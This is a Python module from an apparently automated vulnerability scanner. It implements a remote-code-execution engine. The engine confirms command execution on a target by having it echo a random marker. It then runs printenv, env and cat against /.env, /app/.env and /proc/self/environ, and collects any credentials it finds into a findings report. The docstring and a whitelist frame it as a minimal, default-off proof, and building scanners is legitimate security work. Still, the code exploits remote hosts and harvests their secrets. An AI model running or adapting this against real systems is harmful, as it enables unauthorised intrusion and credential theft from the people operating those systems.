"""L3 RCE — minimal proof with command/path whitelist only.

Default off via RiskPolicy.rce_enabled. Never webshell, lateral movement, or
destructive commands.

Confirmation requires the exact echo of a per-probe **unpredictable** marker.
A plain HTTP 200, a SPA fallback page, or an arbitrary JSON body is NOT proof
of command execution — those cannot echo a random nonce the server never saw.
Secret-reading commands (``printenv`` / ``cat /.env``) only run *after* that
marker has been confirmed, so we never touch secrets on an unproven target.
"""

from __future__ import annotations

import secrets
from typing import TYPE_CHECKING, Any

from .common import EngineResult, make_finding

if TYPE_CHECKING:
    from ..base import Prober
    from ..capability.spec import ProbeSpec
    from ..capability.types import ProbeContext

# Commands/paths the engine will accept from a Spec. Anything else is rejected.
_ALLOWED_COMMANDS = frozenset(
    {
        "echo",
        "printenv",
        "env",
        "id",
        "uname",
        "cat",
    }
)
_ALLOWED_CAT_PATHS = frozenset(
    {
        "/.env",
        "/app/.env",
        "/proc/self/environ",
        "/etc/hostname",
    }
)

# Stable prefix kept only for readability in captured traffic; the security
# property comes from the random suffix appended per probe, never from this.
_MARKER_PREFIX = "aipocket-rce"


def _command_allowed(command: str) -> bool:
    parts = command.strip().split()
    if not parts:
        return False
    base = parts[0].split("/")[-1]
    if base not in _ALLOWED_COMMANDS:
        return False
    if base == "cat":
        if len(parts) != 2:
            return False
        return parts[1] in _ALLOWED_CAT_PATHS
    if base == "echo":
        # Only echo safe args (the caller supplies a random marker token).
        return True
    return len(parts) <= 2


def _new_marker() -> str:
    """Return an unpredictable per-probe marker the target cannot precompute."""
    return f"{_MARKER_PREFIX}-{secrets.token_hex(16)}"


async def run_rce(
    prober: Prober,
    ctx: ProbeContext,
    spec: ProbeSpec,
) -> EngineResult:
    entry = spec.entry
    origin = prober._url(ctx.hit)
    result = EngineResult()
    before = prober.budget_consumed

    path = entry.get("path") or ""
    method = (entry.get("method") or "POST").upper()
    param = entry.get("param") or "command"
    secret_cmds = list(entry.get("secret_commands") or ["printenv", "cat /.env"])

    if not path:
        result.reason = "no rce path"
        return result

    # Ignore any Spec-provided fixed proof_command: proof MUST carry a fresh
    # unpredictable marker so a canned/echoed response cannot fake confirmation.
    marker = _new_marker()
    proof_cmd = f"echo {marker}"
    if not _command_allowed(proof_cmd):  # defensive; echo is always allowed
        result.reason = "proof command not in whitelist"
        return result

    headers: dict[str, str] = {}
    if entry.get("use_auth") and ctx.auth_headers:
        headers = dict(ctx.auth_headers)

    async def _exec(command: str) -> Any:
        if not _command_allowed(command):
            return None
        url = prober._url(ctx.hit, path)
        if method == "GET":
            return await prober._get(url, params={param: command}, headers=headers or None)
        body = dict(entry.get("body") or {})
        body[param] = command
        return await prober._post(url, json=body, headers=headers or None)

    resp = await _exec(proof_cmd)
    result.requests_used = prober.budget_consumed - before

    # Confirmation ONLY on exact echo of the random marker in a 200 response.
    # No length heuristic, no substring of a static token — those false-positive
    # on ordinary JSON / SPA fallbacks and are not evidence of execution.
    confirmed = resp is not None and resp.status_code == 200 and marker in (resp.text or "")

    if not confirmed:
        result.reason = "rce not confirmed (marker not echoed)"
        return result

    # Proven: safe to read secrets now (still whitelist- and budget-gated).
    for cmd in secret_cmds:
        if result.requests_used >= spec.max_requests:
            break
        if not _command_allowed(cmd):
            continue
        resp = await _exec(cmd)
        result.requests_used = prober.budget_consumed - before
        found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_rce_secret")
        result.credentials.extend(found)

    result.findings.append(
        make_finding(
            vuln_class=spec.vuln_class,
            product=spec.product,
            target_origin=origin,
            spec_id=spec.id,
            cve_ids=spec.cve_ids,
            confirmed=True,
            summary=f"RCE minimal proof via {path} (marker echoed)",
            severity="critical",
            credentials=result.credentials,
            evidence={"path": path, "proof_marker_prefix": _MARKER_PREFIX},
        )
    )
    return result
